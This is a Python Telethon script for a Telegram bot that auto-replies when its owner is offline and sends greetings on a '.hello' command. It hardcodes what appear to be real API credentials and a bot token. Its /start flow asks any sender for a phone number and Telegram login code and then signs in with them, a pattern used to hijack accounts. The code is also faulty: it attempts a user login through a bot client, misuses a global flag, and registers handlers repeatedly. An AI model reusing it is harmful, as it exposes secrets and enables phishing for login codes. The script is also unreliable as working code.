import os
import asyncio
from telethon import TelegramClient, events

# Replace with your actual API ID and API Hash
API_ID = 24808705
API_HASH = 'adf3a113ab32bb2792338477f156dc86'
BOT_TOKEN = '8015052876:AAEi65xgC7XzKRcn9hKGBY48wDlFrUDQuUY'  # Replace with your bot token

# Session name for storing login session (not needed for bot)
session_file = 'owner_session'

# Create the Telegram client for the bot
client = TelegramClient(session_file, API_ID, API_HASH).start(bot_token=BOT_TOKEN)

# Variable to track if the owner is online
is_online = False
login_state = False  # To track if login process is ongoing

async def send_message(chat_id, message):
    """ Helper function to send a message. """
    await client.send_message(chat_id, message)

async def prompt_for_phone_number(event):
    """ Prompt for phone number and handle response. """
    await send_message(event.chat_id, "Please enter your phone number:")
    
    @client.on(events.NewMessage(incoming=True, from_users=event.sender_id))
    async def handle_phone_number_response(phone_event):
        global login_state
        phone_number = phone_event.raw_text.strip()
        await send_message(event.chat_id, "Please enter the OTP sent to your Telegram app:")
        login_state = True  # Mark login process as ongoing

        @client.on(events.NewMessage(incoming=True, from_users=event.sender_id))
        async def handle_otp_response(otp_event):
            if login_state:
                otp = otp_event.raw_text.strip()
                await handle_login(phone_number, otp, event.chat_id)
                login_state = False  # Reset login state

async def handle_login(phone_number, otp, chat_id):
    """ Handle the login process. """
    # Start the client with the phone number
    await client.start(phone=phone_number)

    if not await client.is_user_authorized():
        await client.sign_in(phone=phone_number, code=otp)

    await send_message(chat_id, "Logged in successfully.")

    # Access the owner's profile
    me = await client.get_me()
    await send_message(chat_id, f"Owner's Profile: {me.stringify()}")

@client.on(events.NewMessage(incoming=True))
async def handle_commands(event):
    """ Handle commands from the owner. """
    if event.raw_text.startswith('/start'):
        await prompt_for_phone_number(event)

    # Event to handle incoming private messages
    @client.on(events.NewMessage(incoming=True))
    async def handle_incoming_message(event):
        global is_online
        sender = await event.get_sender()

        # Only handle private messages (not in groups) and non-bot senders
        if event.is_private and not sender.bot:
            # Only send auto-reply if owner is offline
            if not is_online:
                offline_message = await event.reply("Owner is offline. See you soon!")
                await asyncio.sleep(10)  # Wait for 10 seconds
                await client.delete_messages(event.chat_id, offline_message.id)  # Delete offline message

    # Event to monitor the owner's outgoing messages
    @client.on(events.NewMessage(outgoing=True))
    async def handle_outgoing_message(event):
        global is_online

        # Set online status when sending a message
        is_online = True

        # Check if the outgoing message is the ".hello" command
        if event.raw_text.strip() == '.hello':
            # Get the recipient's chat entity
            recipient = await event.get_chat()
            username = recipient.first_name if recipient.first_name else "User"

            # Send a personalized message to the user
            response_message = await client.send_message(recipient.id, f"Hello {username}, how are you?")

            # Delete the ".hello" command message
            await client.delete_messages(event.chat_id, event.id)

            # Optional: wait a bit before resetting online status
            await asyncio.sleep(2)
            is_online = False  # Reset online status

async def main():
    print("Bot is running and listening for messages...")
    await client.run_until_disconnected()  # Run the main function

# Run the main function
loop = asyncio.get_event_loop()
loop.run_until_complete(main())
